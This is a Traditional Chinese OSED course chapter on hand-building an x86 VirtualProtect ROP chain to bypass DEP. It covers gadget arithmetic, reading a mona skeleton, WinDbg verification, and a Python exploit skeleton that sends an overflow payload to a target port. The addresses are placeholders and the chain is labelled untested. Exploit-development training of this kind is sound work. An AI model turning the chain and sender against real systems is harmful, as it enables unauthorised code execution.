# Ch 29 — 手工打造 VirtualProtect / VirtualAlloc ROP chain

> **目標**：把 Ch 27–28 的原理和規劃思路,收斂成一條真正能跑的 x86 ROP chain——逐步拼出呼叫 `VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect)` 所需的完整 stack 佈局,包含怎麼用 gadget 動態算出 `lpAddress`、怎麼用算術 gadget 繞開 `0x40` 可能卡到的壞字元,再讀懂並補完 mona `!py mona rop` 產生的 skeleton,最後整合成一支完整 Python exploit 骨架。

> **環境**：Win10 x64 + WinDbg（2026）+ mona v3 + Python 3

## 為什麼這條 chain 是 OSED 的核心動作

Ch 27 講完「為什麼要繞 DEP」、Ch 28 講完「怎麼找 gadget、怎麼規劃」,這一章把兩者合起來做一件具體的事：**打一條 ROP chain,呼叫 `VirtualProtect`,把已經在 stack 上的 shellcode 所在那一頁改成可執行,再跳過去跑**。

這是 OSED 考場 DEP bypass 題型裡最常見、最該練到肌肉記憶的動作。原因很實際：`VirtualProtect` 的參數少（四個）、效果直接（改一頁的保護),比起 `VirtualAlloc` 要再接一次複製步驟（Ch 30),是進入門檻最低、產出最快的路線。練熟這條,再去理解 Ch 30 的其他路徑會輕鬆很多。

## 先建立直覺：VirtualProtect 要接住什麼

複習 Ch 27 的 ASCII 圖再往前一步——這次把「VirtualProtect 要看到的東西」畫清楚：

```
overflow 蓋 EIP/SEH handler 之後,ESP 落在我們完全掌控的那一段 stack 上：

  ESP →┌───────────────────────────────┐
       │   這裡開始是攻擊者填的資料      │
       │   (接下來要排成一條 ROP chain)  │
       └───────────────────────────────┘

目標：讓接下來的執行流變成「好像有人正常呼叫了」：

  VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
  // 呼叫完後跳到 lpAddress 開始執行

stdcall 的函式呼叫,CPU/被呼叫方眼中看到的 stack（呼叫瞬間,ESP 指向 return address）：

  ESP → [return_address]        ← 函式執行完 ret 要跳去哪
         [arg1: lpAddress]       ← 第一個參數(由右至左 push,所以離 ESP 最近的是第一個)
         [arg2: dwSize]
         [arg3: flNewProtect]
         [arg4: lpflOldProtect]
```

ROP 要做的事,就是**讓 EIP 跳到 `VirtualProtect` 函式入口的瞬間,ESP 恰好指著上面這個佈局**。因為 `VirtualProtect` 不知道、也不在乎呼叫它的是正常 `call` 還是 ROP 的 `ret`——它只看 ESP 指向的那四個 dword 是不是它期望的四個參數。這正是 ROP「偽造函式呼叫」的本質。

## 核心：VirtualProtect 的簽名與參數語意（MSDN 為準）

```c
BOOL VirtualProtect(
    LPVOID lpAddress,          // 要改保護的記憶體區起始位址
    SIZE_T dwSize,              // 要改的區域大小(bytes)
    DWORD  flNewProtect,        // 新的保護旗標
    PDWORD lpflOldProtect       // [out] 存放舊保護旗標的位址;必須是可寫的
);
// 回傳:非 0 表示成功
```

| 參數 | 型別 | 大小(x86) | 本章用值 | 備註 |
|---|---|---|---|---|
| `lpAddress` | `LPVOID` | 4 bytes | shellcode 在 stack 上的位址 | 必須對齊到頁邊界以內（函式會自動把範圍調整到涵蓋的整頁,不需要攻擊者自己對齊） |
| `dwSize` | `SIZE_T` | 4 bytes | 略大於 shellcode 長度,例如 `0x200` | 太小可能漏蓋到 shellcode 尾端所在頁 |
| `flNewProtect` | `DWORD` | 4 bytes | `PAGE_EXECUTE_READWRITE = 0x40` | MSDN `WinNT.h` 定義的保護常數之一 |
| `lpflOldProtect` | `PDWORD` | 4 bytes | 任意一塊**可寫**位址 | 常用「ROP chain 自己佔用的某個已知可寫位址」頂替,反正值不重要 |

呼叫慣例是 **`__stdcall`**：參數由右至左 push（所以 stack 上從 ESP 往高位址讀,第一個碰到的是 `lpAddress`),**callee（被呼叫方,也就是 `VirtualProtect` 自己）負責清理 stack**——這代表 ROP chain 不用自己再清這四個參數,`VirtualProtect` 內部的 `ret 10`（彈 4 個參數 + 返回位址共 20 bytes 中,扣掉返回位址自己彈的 4,剩 16,即 `ret 0x10`）會處理掉。這點和 `__cdecl`（呼叫者自己清)不同,Ch 3 已經帶過,這裡是它第一次在 ROP chain 裡真正發威的場景。

## 逐步拆解：stack 佈局要放什麼

把 Ch 28 的「倒著想」規劃法套用到這個具體目標：

### Step 1：死的部分——函式呼叫佈局

```
[VirtualProtect 位址]      ← 某個 gadget/ret 彈到這裡,CPU 當成"call"落地
[shellcode_addr]           ← VirtualProtect 內部的 ret 10 會彈到這裡,當成返回位址
[shellcode_addr]           ← arg1 = lpAddress
[0x200]                    ← arg2 = dwSize
[0x40]                     ← arg3 = flNewProtect
[writable_addr]            ← arg4 = lpflOldProtect
```

這六個 dword 的順序和位置是**死的**,stdcall 決定,不能調換。

### Step 2：活的部分——哪些值需要 gadget 動態產生

對照上面六格,逐一檢查「能不能直接把常數寫進 payload」：

| 格子 | 能直接寫常數嗎 | 原因 |
|---|---|---|
| `VirtualProtect 位址` | 能 | 這是固定位址（假設模組無 ASLR 或已 leak),直接寫 4 bytes |
| `shellcode_addr`（兩處都一樣） | **通常不能直接寫死** | shellcode 在 stack 上的絕對位址,通常難以在寫 exploit 時就精確推算（受 payload 長度微調、環境差異影響),較穩的做法是**執行時用 ESP 相對位置動態算出來** |
| `0x200` | 能 | 固定常數,只要不含壞字元 |
| `0x40` | **看壞字元環境** | 如果 `0x40` 本身安全就直接寫;如果目標協定把某些 byte 當終止符而剛好影響到這個位置,改用算術 gadget 產生 |
| `writable_addr` | 能 | 只要能找到一塊已知可寫位址(常見作法：指向 chain 自己佔用的某段 stack,反正裡面的舊值被覆蓋也不影響),直接寫死 |

本章示範**兩個都用 gadget 動態產生**的版本（`shellcode_addr` 一定要,`0x40` 示範算術技巧),這樣你學到的技巧覆蓋面更廣,即使你的實際環境允許直接寫死某些值,也知道退路在哪。

### Step 2a：用 gadget 動態算出 shellcode 位址

常見做法：在 ROP chain 執行的某一刻,`ESP` 本身就指向 chain 附近的位置,而 shellcode 通常緊跟在 chain 後面。只要知道「shellcode 距離目前 ESP 的固定 offset」,就能用一個「把 ESP 的值複製到某個暫存器,再加上 offset」的 gadget 組合算出 shellcode 絕對位址：

```
常見組合(示意,實際 gadget 位址依目標而定)：

  gadget A：mov eax, esp ; ret          (或 push esp; pop eax; ret)
            → eax = 目前 ESP 的值

  gadget B：add eax, <offset> ; ret
            → eax = shellcode 的絕對位址(offset 是從這個 gadget 執行時的
              ESP 位置數到 shellcode 開頭的 bytes 數,需要在排好完整 chain
              之後,反過來精確計算這個 offset)

  之後需要把 eax 的值「搬」到參數該在的位置：
  gadget C：mov [some_writable], eax ; ret
            然後用 pop/ret 把 some_writable 的內容讀出來放進 arg1、arg2 的位置

或更直接的作法(mona 常用的 pattern)：
  先把 eax 設成 shellcode_addr,然後用 pushad 把 eax 的值連同其他已設好
  的暫存器一次性 push 到 stack,剛好湊出 stdcall 需要的參數序列(見下方 mona 段落)
```

> **未實測,理論預期**：「ESP 加 offset 算出 shellcode 絕對位址」的精確 offset 數字,只能在排好完整 chain（已知每個 gadget/參數佔多少 bytes）之後反推,且因環境（payload 長度、是否有 NOP sled 等）而異。驗證法：先用 `\xcc`（INT3)取代真正 shellcode,在 WinDbg 裡單步確認 `eax` 最終算出來的位址,和 shellcode 實際所在位址是否吻合,再換回真正 shellcode。

### Step 2b：用算術 gadget 繞開 0x40 的壞字元問題

假設這次環境裡 `0x40` 這個值本身沒問題（絕大多數情況確實沒問題,`0x40` 不是常見壞字元),但示範一下**如果**它卡到某種過濾,怎麼用 Ch 28 教的技巧迴避：

```
目標：某個暫存器最終要變成 0x00000040

方法：neg
  pop eax ; ret         → eax = 0xFFFFFFC0      (這個值本身安全,不含壞字元)
  neg eax ; ret          → eax = 0x00000040      ✓ (0xFFFFFFC0 取二補數 = 0x40)

驗算: 0xFFFFFFC0 = -64(十進位,視為 signed 32-bit)
      neg 取二補數 = 64 = 0x40  ✓
```

這個技巧的通用寫法：想要的值是 `V`,先湊出 `0x100000000 - V`（也就是 `-V` 的 32-bit 二補數表示),只要這個中間值本身不含壞字元,就能用 `neg` 一步轉換回 `V`。

## 完整 x86 VirtualProtect ROP chain 佈局圖

把 Step 1、2 合起來,畫出完整執行流：

```
stack（從 ROP chain 起點開始,往高位址排,x86）：

┌────────────────────────────────────────────────────────────┐
│ ① [gadget: mov eax, esp ; ret]                              │
│      → eax = 目前 ESP                                        │
│                                                              │
│ ② [gadget: add eax, OFFSET_TO_SHELLCODE ; ret]              │
│      → eax = shellcode 絕對位址                               │
│                                                              │
│ ③ [gadget: xchg eax, ebx ; ret]     (或 mov ebx, eax ; ret) │
│      → ebx = shellcode 位址 (暫存,稍後要用兩次:arg1 和返回位址) │
│                                                              │
│ ④ [gadget: pop eax ; ret]                                   │
│    [0xFFFFFFC0]                                              │
│      → eax = 0xFFFFFFC0                                      │
│                                                              │
│ ⑤ [gadget: neg eax ; ret]                                    │
│      → eax = 0x00000040 (PAGE_EXECUTE_READWRITE)             │
│                                                              │
│ ⑥ [gadget: pushad ; ret]                                    │
│      → 一次把 EAX,ECX,EDX,EBX,原ESP,EBP,ESI,EDI 全部 push    │
│        若事先把 EBX=shellcode_addr, EAX=0x40 設好,           │
│        pushad 的結果恰好能湊出我們要的部分參數序列            │
│        (實務上常需要再搭配幾個 pop/調整 gadget修正順序,       │
│         這段是 mona 自動化最常處理的部分,見下方)              │
│                                                              │
│ ⑦ [VirtualProtect 位址]                                      │
│ ⑧ [shellcode_addr]        ← 返回位址(=shellcode起點)          │
│ ⑨ [shellcode_addr]        ← arg1: lpAddress                  │
│ ⑩ [0x200]                 ← arg2: dwSize                     │
│ ⑪ [0x00000040]            ← arg3: flNewProtect                │
│ ⑫ [writable_addr]         ← arg4: lpflOldProtect              │
│                                                              │
│ [shellcode bytes ...]     ← VirtualProtect 返回後,EIP 跳這裡  │
└────────────────────────────────────────────────────────────┘

執行流總結：
 1. ①-③ 算出並暫存 shellcode 絕對位址
 2. ④-⑤ 用 neg 技巧算出 0x40(示範用,實際若 0x40 本身安全可省略,直接寫常數)
 3. ⑥ (選用) pushad 快速湊參數,或改用純 pop/push 逐一排(見下方「純手排版」)
 4. ⑦-⑫ 進入死的 stdcall 佈局,ret 落到 VirtualProtect 入口
 5. VirtualProtect 內部執行完,flNewProtect=0x40 生效,原本 NX 的頁變成 RWX
 6. VirtualProtect 的 ret 10 彈出 ⑧ 當返回位址 → EIP = shellcode_addr
 7. shellcode 開始執行(此時所在頁已經可執行)
```

> **未實測,理論預期**：⑥ 的 `pushad` 整合方式高度依賴實際找到的 gadget 組合,上圖是示意性骨架,不是可以直接照抄貼上就跑的位址清單。驗證法見本章最後「完整 Python chain 範例」段落的單步驗證法。

### 純手排版（不靠 pushad,逐一 pop 設值)

如果你的 gadget 庫裡沒有乾淨的 `pushad`,或想要完全掌控每個步驟,可以改成逐一用 `pop reg; ret` 把四個參數「擺」到正確的 stack 位置上——這種寫法不是把參數值放進暫存器再 pushad,而是直接利用 ROP chain 本身已經是連續 stack 資料的特性：**只要⑦-⑫ 這六格本身就按順序寫在 payload 裡,根本不需要任何 gadget**,因為 `ret` 彈完 `VirtualProtect` 位址之後,ESP 自然指向下一格,`VirtualProtect` 函式自己會去讀它正下方的四個 dword 當參數。

這帶出一個重要澄清：**⑦-⑫ 這六格如果值都能直接確定,完全不需要 gadget,直接當成普通資料寫進 payload 即可**。真正需要 gadget 的,只有 ①-⑥ 那些「值要動態算」的部分。很多時候 OSED 考場的實際情況比上圖簡單得多——如果 `lpAddress` 可以用一個**已知的、不會變的** stack 位址(例如和 payload 起點的固定 offset,在沒有 ASLR 影響 stack 相對位置的情況下是穩定的),你甚至可以完全跳過 ①-③,直接把算好的常數位址寫進 ⑨。本章刻意示範「最複雜、最通用」的動態算法版本,實際做題先嘗試「能不能直接寫死」,能省則省。

## mona `!py mona rop` 產生的 skeleton 怎麼讀

Ch 28 提過,mona 掃完 gadget 後會順手生成一份 `rop_chains.txt`,裡面通常長這樣（示意,未實測）：

```python
# rop_chains.txt 節錄(mona 自動生成,未實測示意)
def create_rop_chain():

    rop_gadgets = [

            #[---INFO:gadgets_to_set_esi:---]
            0x1001d4a5,  # POP ESI # RETN [target.dll]
            0x1002ab30,  # ptr to &VirtualProtect() [IAT target.dll]

            #[---INFO:gadgets_to_set_ebp:---]
            0x1001c204,  # POP EBP # RETN [target.dll]
            0x1001a8b2,  # & push esi # ret [target.dll] (用來把 ESI 指向的
                         # &VirtualProtect 內容 push 出去,間接取得函式真實位址)

            #[---INFO:gadgets_to_set_ebx:---]
            0x10012a19,  # POP EBX # RETN [target.dll]
            0x00000201,  # 0x00000201-> ebx (shellcode 的 size,略大於實際長度)

            #[---INFO:gadgets_to_set_edx:---]
            0x10013f44,  # POP EDX # RETN [target.dll]
            0x00000040,  # 0x00000040-> edx (PAGE_EXECUTE_READWRITE)

            #[---INFO:gadgets_to_set_ecx:---]
            0x10011abc,  # POP ECX # RETN [target.dll]
            0x1004f210,  # &Writable location [target.dll] (lpflOldProtect)

            #[---INFO:gadgets_to_set_eax:---]
            0x1001eaa0,  # POP EAX # RETN [target.dll]
            0x1001d040,  # ptr to jmp esp [target.dll] (稍後跳 shellcode 用)

            #[---INFO:pushad:---]
            0x1001b3e5,  # PUSHAD # RETN [target.dll]
    ]

    return b"".join(struct.pack("<I", g) for g in rop_gadgets)
```

### 讀懂這份骨架的關鍵

1. **每個 `#[---INFO:gadgets_to_set_XXX:---]` 區塊**,代表 mona 判斷「這個 stdcall 需要用某個暫存器裝某個參數」,先用 `pop reg; ret` 把目標值載進那個暫存器。
2. **`PUSHAD` 放在最後**：等到 EAX/EBX/ECX/EDX 等暫存器全部設好想要的值,一次 `pushad` 把它們依固定順序（EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI）推上 stack,剛好組成 `VirtualProtect` stdcall 期望的參數序列——**前提是 mona 選的暫存器順序和 `pushad` 的推送順序,恰好對得上 stdcall 的參數順序**。這是 mona 的固定套路,不是巧合,它在生成時就是照這個順序配置的。
3. **`EAX` 常被用來存「返回位址」**：上面範例裡 `EAX` 最後被設成 `ptr to jmp esp`,意思是 VirtualProtect 執行完 `ret` 之後,會跳到這個「`jmp esp`」小 gadget,再讓它跳到當時 ESP 指向的地方——這其實是另一種「跳到 shellcode」的方式（不直接寫死 shellcode 絕對位址,而是借一個 `jmp esp` 跳板),在 payload 結構配合得當時（shellcode 緊接著放在 ROP chain 後面),能避開「精確算 shellcode 絕對位址」這個麻煩步驟。

### 怎麼補洞

mona 生成的骨架幾個常見要補的地方：

- **`[target.dll]` 要換成實際模組名和你確認過的真實位址**：mona 掃描時基於它看到的記憶體狀態,如果你的環境和它掃描時不完全一樣（例如補丁版本),位址會對不上,需要重新掃描或手動核對。
- **`lpflOldProtect` 的「Writable location」要自己驗證可寫**：mona 通常會選一個它認為安全的位址（例如某個 `.data` 節),但如果該位址在你的情境下其實已經被别的資料佔用,可能造成非預期覆寫——建議核對一次。
- **shellcode 的 size（`0x201` 這類值）要比照你實際的 shellcode 長度調整**：直接套用示範值,如果你的 shellcode 比這個大,`VirtualProtect` 蓋的範圍可能不夠完整,執行到 shellcode 尾端時又踩回 NX 頁。

## 完整 Python chain 範例

把上面所有概念整合成一支完整（但位址全部示意、待替換）的 exploit 骨架：

```python
#!/usr/bin/env python3
# exploit_ch29.py — 手工 VirtualProtect ROP chain 骨架
# 未實測,理論預期。所有 0xXXXXXXXX 需替換為實測環境的真實位址。

import socket
import struct
import sys

def p32(v):
    return struct.pack("<I", v)

target_ip   = "192.168.x.x"
target_port = 9999

# ── 量測結果(需從 Ch 7-8 的 offset/badchar 分析得到)────────────
OFFSET_TO_EIP = 2006          # overflow 到蓋 EIP 的 offset(示意)

# ── gadget 位址(全部示意,需用 Ch 28 的方法在真實目標上找出)─────
GADGET_MOV_EAX_ESP     = 0x1001AAAA   # mov eax, esp ; ret
GADGET_ADD_EAX_OFFSET  = 0x1001BBBB   # add eax, <OFFSET_TO_SHELLCODE> ; ret
GADGET_XCHG_EAX_EBX    = 0x1001CCCC   # xchg eax, ebx ; ret
GADGET_POP_EAX_RET     = 0x1001DDDD   # pop eax ; ret
GADGET_NEG_EAX_RET     = 0x1001EEEE   # neg eax ; ret
GADGET_POP_ECX_RET     = 0x1001FFFF   # pop ecx ; ret (示範:用來擺 lpflOldProtect)
VIRTUALPROTECT_ADDR    = 0x76001234   # VirtualProtect 在 kernel32.dll 的位址(示意)

WRITABLE_SCRATCH       = 0x10050000   # 已知可寫位址,當 lpflOldProtect 用(示意)
SHELLCODE_SIZE         = 0x300        # 略大於 shellcode 實際長度
OFFSET_TO_SHELLCODE    = 0x00000050   # 從 "mov eax,esp" 那一刻的 ESP,
                                       # 數到 shellcode 開頭的 bytes 數
                                       # (需在排好完整 chain 後反算,示意值)

PAGE_EXECUTE_READWRITE_NEG = 0xFFFFFFC0   # 0x100000000 - 0x40,用於 neg 技巧

def build_rop_chain():
    chain = b""

    # ① 取得目前 ESP
    chain += p32(GADGET_MOV_EAX_ESP)

    # ② eax += OFFSET_TO_SHELLCODE  → eax = shellcode 絕對位址
    chain += p32(GADGET_ADD_EAX_OFFSET)
    chain += p32(OFFSET_TO_SHELLCODE)   # 如果 gadget 本身是 "add eax, imm32 ; ret"
                                          # 則這個 imm32 是編碼在 gadget 指令裡,
                                          # 不是額外的 stack 值;此處僅示意資料流向,
                                          # 實際要核對 gadget 是否吃 stack 上的立即值
                                          # 還是指令內建常數(多數 add eax,imm32 是後者)

    # ③ ebx = eax(shellcode 位址),留著待會當 lpAddress 和返回位址
    chain += p32(GADGET_XCHG_EAX_EBX)

    # ④-⑤ 用 neg 湊出 0x40
    chain += p32(GADGET_POP_EAX_RET)
    chain += p32(PAGE_EXECUTE_READWRITE_NEG)
    chain += p32(GADGET_NEG_EAX_RET)

    # ⑫ 先把 lpflOldProtect 需要的 scratch 位址準備好(此處簡化,直接當常數用)
    #    純手排版不需要額外 gadget,下面直接把六格死佈局接上

    # ⑦-⑫ stdcall 死佈局
    chain += p32(VIRTUALPROTECT_ADDR)      # ⑦ call 落點
    chain += p32(0xdeadbeef)               # ⑧ 返回位址佔位
                                            #    (實際要等於 ebx 存的 shellcode 位址;
                                            #     純 pop/write 排法下,通常改用
                                            #     mov [stack_slot], ebx 類 gadget 動態補回,
                                            #     或改用 "jmp esp" 跳板法避開這格要精確值的麻煩)
    chain += p32(0xdeadbeef)               # ⑨ arg1: lpAddress(同上,需等於 ebx)
    chain += p32(SHELLCODE_SIZE)           # ⑩ arg2: dwSize
    chain += p32(0x00000040)               # ⑪ arg3: flNewProtect
                                            #    (若④⑤的neg已把 eax算好,此處可改用
                                            #     mov [stack_slot], eax 寫回,本骨架為清晰
                                            #     起見直接示意寫常數)
    chain += p32(WRITABLE_SCRATCH)         # ⑫ arg4: lpflOldProtect

    return chain


def build_shellcode():
    # 真正的 shellcode 應該用 Ch 25/26 寫好的 bad-char-free reverse shell
    # 這裡先用 NOP + INT3 佔位,方便 WinDbg 單步驗證執行流是否到位
    return b"\x90" * 16 + b"\xcc"


def main():
    rop = build_rop_chain()
    shellcode = build_shellcode()

    payload  = b"A" * OFFSET_TO_EIP
    payload += rop
    payload += shellcode

    print(f"[*] rop chain length: {len(rop)} bytes")
    print(f"[*] total payload length: {len(payload)} bytes")

    if "--send" in sys.argv:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(payload + b"\r\n")
        s.close()
        print("[+] payload sent")
    else:
        print("[*] dry-run only; pass --send to actually send")


if __name__ == "__main__":
    main()
```

> **未實測,理論預期**：以上腳本中所有 `0xXXXXXXXX` 風格的位址和 ⑧⑨ 兩格「需要動態補回」的提示,都是教育性骨架,不是可以直接貼上就跑的 exploit。這支腳本的目的是示範**資料流和佈局的完整性**,實際對一個真實目標使用前,⑧⑨ 兩格必須換成「用 gadget 把 ebx(shellcode 位址)寫進這兩個 stack slot」的正確做法（例如用 `mov [eax], ebx; ret` 配合先把 `eax` 設成指向這兩個 slot 的位址),或改用 `jmp esp` 跳板完全迴避這個問題——這正是 mona 自動生成的 chain 通常會處理得比手排更乾淨的地方,也是為什麼 Ch 28 建議「mona 先掃、手動核對、必要時修補」而不是從零手排。

## WinDbg 單步驗證法（逐步核對每個 ret）

因為這條 chain 全程標「理論預期」,下面是驗證它是否真的照預期跑的步驟,供你在自己的 VM 裡動手確認：

1. 在發送 payload **之前**,先在 WinDbg 裡對 chain 的第一個 gadget 位址下斷點：`bp 0x1001AAAA`。
2. 發送 payload,等 WinDbg 在該斷點停下。
3. 用 `p`（或 `t`,若要連指令內部都看)一步一步走,每走一個 `ret` 就檢查：
   - `r eax, ebx, esp` 看暫存器值是否符合預期（例如走完①後 `eax` 應該等於走到這裡時的 `esp` 值)。
   - `dd esp L4` 看接下來四個 dword 是不是下一個該被彈出的 gadget 位址。
4. 走到 `VirtualProtect` 入口時,下斷點 `bp <VirtualProtect_addr>`,用 `dd esp L4` 核對 ESP 正上方四格是不是 `lpAddress/dwSize/flNewProtect/lpflOldProtect` 四個期望值。
5. `p` 走完 `VirtualProtect`（或用 `pt` 跑到下一個 `ret`),用 `!vprot <lpAddress>`（mona/WinDbg 擴充指令,查某頁的保護旗標)確認該頁變成 `PAGE_EXECUTE_READWRITE`。
6. 繼續單步,確認 EIP 落到 shellcode 起點（這時如果 shellcode 還是 `\xcc` 佔位,應該會停在 `INT3`),代表整條 chain 成功跑完。

> **未實測,理論預期**：上述 WinDbg 指令（`bp`、`p`、`dd`、`!vprot`)語法以 WinDbg 官方文件和 mona 文件為準,本機未實際對照一個真實崩潰的 process 跑過這套流程。

## 對比取捨：純手排 vs mona 自動 vs jmp esp 跳板

| 做法 | 優點 | 缺點 |
|---|---|---|
| **純手排（Step 2a/2b 示範的動態算位址）** | 完全理解每一步,不依賴環境裡恰好有乾淨的 `pushad` | 耗時,容易在「返回位址/arg1 需要等於動態算出的值」這類環節漏掉補值步驟 |
| **mona 自動生成（pushad pattern）** | 省力,mona 已經處理好大部分暫存器配置順序 | 骨架有時用你不熟悉的暫存器選擇,需要花時間逆向理解才能信任/修改 |
| **jmp esp 跳板法** | 完全迴避「精確算 shellcode 絕對位址」的麻煩,只要 shellcode 緊接 chain 之後放,`jmp esp` 永遠跳得對 | 需要額外找一個 `jmp esp` gadget;且要求 chain 執行到那一刻 ESP 恰好指向 shellcode 開頭,payload 長度算錯會跳偏 |

## 踩雷集錦

1. **返回位址和 arg1 寫成一樣的常數,卻忘記它們其實依賴「動態算出的 shellcode 位址」**：Step 1 的死佈局圖裡 ⑧⑨ 兩格值相同,很容易以為可以直接複製貼上同一個寫死的數字——但如果 shellcode 位址無法事先精確推算（常見情況),這兩格必須用 gadget 在執行時動態填入,不能當成普通常數處理。

2. **`add eax, imm32 ; ret` 的 imm32 來源搞混**：這種 gadget 的立即值是**編碼在該 gadget 指令本身裡的**,不是從 stack 上額外彈一個值——如果你以為它會像 `pop` 一樣再吃一個 stack dword,chain 會整體錯位。每個 gadget 用之前先反組譯確認它到底吃不吃額外的 stack 輸入。

3. **忘記驗證 `lpflOldProtect` 指向的位址真的可寫**：如果選了一個唯讀頁的位址,`VirtualProtect` 直接回傳失敗（`FALSE`),整條鏈在這一步死掉,而且不一定會立刻 crash——程式可能若無其事繼續往下跑,讓你以為 chain 有問題,其實問題出在這個參數。

4. **`dwSize` 給太小**：只蓋到 shellcode 前半段所在頁,shellcode 執行到後半段落在另一頁時又被 NX 擋下。保守估計,`dwSize` 給 shellcode 長度加一個頁（通常 `0x1000`)的 buffer 更安全,但要注意別讓範圍蓋到不該改權限的其他記憶體。

5. **單步除錯時忘記除錯器本身會影響記憶體佈局**：WinDbg attach 時會改變某些 heap 行為（如 `PEB.NtGlobalFlag`),stack 的絕對位址也可能和「沒有除錯器直接跑」時不同。只在除錯器裡測成功,不代表沒有除錯器時也成功——這點 Ch 30 會再展開。

## 進階：再往深一層

- **跳過「算 shellcode 絕對位址」的另一條路：直接 ret 到 shellcode 之前的 egghunter**：如果你的 overflow 空間允許,也可以讓 ROP chain 執行完 `VirtualProtect` 後跳到一個固定、可預測的 egghunter（Ch 20）而不是直接跳 shellcode 本身,讓 egghunter 自己在記憶體裡搜尋 shellcode 的 "egg" 標記——這樣完全不需要 Step 2a 那一整段動態算位址的 gadget,用空間換取 gadget 複雜度。
- **ROP chain 的「自我修補」技巧**：某些情況下,`mov [addr], reg; ret` 這類 gadget 可以用來讓 ROP chain 在執行過程中**修改自己後面還沒執行到的部分**——例如把某個還沒被彈出的 dword slot,動態改寫成剛算出來的 shellcode 位址。這是 mona 生成的某些複雜 chain 裡會用到的手法,知道這個可能性,日後讀到更複雜的生成 chain 不會看不懂。

## 本章重點整理

- `VirtualProtect` 的 stdcall 佈局是**死的**（函式位址 → 返回位址 → 四個參數，由右至左對應 `lpAddress/dwSize/flNewProtect/lpflOldProtect`),ROP chain 真正需要 gadget 處理的,只是其中「值無法事先確定」的部分。
- `lpAddress`（shellcode 位址)通常是最需要動態算的值,常見手法是用 `mov eax, esp ; ret` + `add eax, offset ; ret` 算出來,或改用 `jmp esp` 跳板完全迴避。
- `flNewProtect = 0x40`（`PAGE_EXECUTE_READWRITE`)如果遇到壞字元問題,可以用 `pop eax;ret` 湊一個安全值再 `neg eax;ret` 轉換。
- mona `!py mona rop` 生成的骨架通常用 `pop reg;ret` 逐一設暫存器 + 最後一個 `pushad` 的套路,讀懂每個 `#[---INFO:...]` 區塊對應哪個參數,是補洞的關鍵。
- 整條鏈全程標「未實測,理論預期」——WinDbg 單步驗證（逐 gadget 核對 ESP/暫存器,`VirtualProtect` 呼叫前核對四個參數,呼叫後用 `!vprot` 核對保護旗標)是把理論變成確定能跑的 exploit 的唯一方法。

## 自我檢核

- [ ] 能不看筆記畫出呼叫 `VirtualProtect` 的六格死佈局,說出每格對應哪個參數
- [ ] 能解釋為什麼 `__stdcall` 讓 ROP chain 不用自己清理這四個參數的 stack 空間
- [ ] 能說出至少兩種「算出 shellcode 絕對位址」的手法,以及各自的前提
- [ ] 能用 `neg` 技巧,給定一個目標值,手算出要先湊出哪個中間值
- [ ] 能說出 mona 生成的 ROP chain 骨架裡,`PUSHAD` 前面那些 `pop reg;ret` 分別在做什麼
- [ ] 能列出至少三個 WinDbg 單步驗證這條 chain 的具體檢查點

## 延伸閱讀

- **[VirtualProtect function — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)**
  - 讀哪裡：參數表、回傳值說明,以及 `PAGE_*` 保護常數的完整清單（連到 `Memory Protection Constants` 頁)。
  - 學什麼：本章四個參數語意、`0x40` 常數值的權威出處；寫 chain 前後都該回來核對。
  - 前提：無。

- **Corelan — "Exploit writing tutorial part 10: Chaining DEP with ROP"**（corelan.be）
  - 讀哪裡：`!mona rop` 實際輸出範例,以及文中對 `pushad` pattern 的解釋段落。
  - 學什麼：mona 生成骨架的實務解讀,和本章「怎麼讀懂 skeleton」段落互補,案例更完整。
  - 前提：Ch 28 + 本章。

- **[corelan/mona（GitHub）](https://github.com/corelan/mona)**
  - 讀哪裡：README 裡 `rop` 指令段落,特別是 `-m`/`-cpb` 之外的進階旗標（例如指定 `-t` 只找特定型別 gadget）。
  - 學什麼：`!py mona rop -m <modules> -cpb "\x00\x0a\x0d"` 的完整用法與輸出檔案格式。
  - 前提：Ch 28。

- **[Install the Windows debugger / WinDbg command reference — Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)**
  - 讀哪裡：`bp`、`p`/`t`、`dd` 等基本指令說明段落。
  - 學什麼：本章「WinDbg 單步驗證法」用到的每個指令的精確語法。
  - 前提：Ch 4–5（WinDbg 精通 I/II）。

chain 的理論和單步驗證法都備齊了,下一章把視角拉開——VirtualProtect 不是唯一路徑,還有 VirtualAlloc、WriteProcessMemory 等備案,以及更重要的：怎麼有系統地在 WinDbg 裡除錯一條歪掉的 ROP chain。

→ [Ch 30 WriteProcessMemory 等其他路徑 + 除錯 ROP chain](./30-other-dep-bypass-paths.md)
